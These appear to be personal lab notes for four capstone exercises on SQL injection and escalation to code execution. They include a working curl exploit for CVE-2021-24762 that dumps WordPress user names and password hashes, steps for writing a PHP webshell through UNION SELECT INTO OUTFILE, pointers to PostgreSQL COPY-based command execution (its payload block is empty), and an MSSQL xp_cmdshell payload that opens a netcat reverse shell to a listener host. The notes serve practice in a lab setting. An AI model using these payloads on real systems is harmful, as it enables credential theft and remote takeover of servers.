# Capstone
## Capstone 1
- Got SQLi using CVE-2021-24762
- curl "http://alvida-eatery.org/wp-admin/admin-ajax.php?action=get_question&question_id=1%20union%20select%201%2C1%2Cchar(116%2C101%2C120%2C116)%2Cuser_login%2Cuser_pass%2C0%2C0%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%20from%20wp_users"
## Capstone 2
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#using-copy-tofrom-program
- Capture the request of subscribing newsletter with Burp and test the parameter for sqli vulnerability with a single quote ('). 
- Use an ORDER BY query to determine the number of columns in the vulnerable parameter. 
- To find the correct column, you can test the "@@version" payload for each column to check if you are retrieving the database version. 
- Inject a simple php webshell payload using a "union select" query and "into outfile" write the webshell to the /var/www/html directory.
- Access the webshell for RCE and execute commands on the server.
## Capstone 3
1) Test for SQL injection by adding a single quote (') to each input parameter and check for errors. 
2) Based on the error received, check which DBMS you are facing. 3) Based on the target DBMS, try to get a code execution. 
3) Code execution on PostgreSQL DBMS is slightly different than MSSQL or Mysql DBMSes. Copy statement should be used. 
4) Check out CVE-2019-9193: [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-command-execution](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-command-execution "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-command-execution")
5) Payload:

	```

## Capstone 4
1) Test the username or password fields by adding a single quote('). If there's an error or strange behavior, it might indicate SQL injection. 
2) Use time-based payloads to identify the database system. 
3) Once the db system is known, look for specific vulnerabilities to gain further access. 
4) For MSSQL, check and enable xp_cmdshell if necessary including advanced options.
5) Payloads look like this:
	```
	';EXEC xp_cmdshell 'c:/windows/temp/nc64.exe -e cmd.exe 192.168.45.199 4444';--
	```
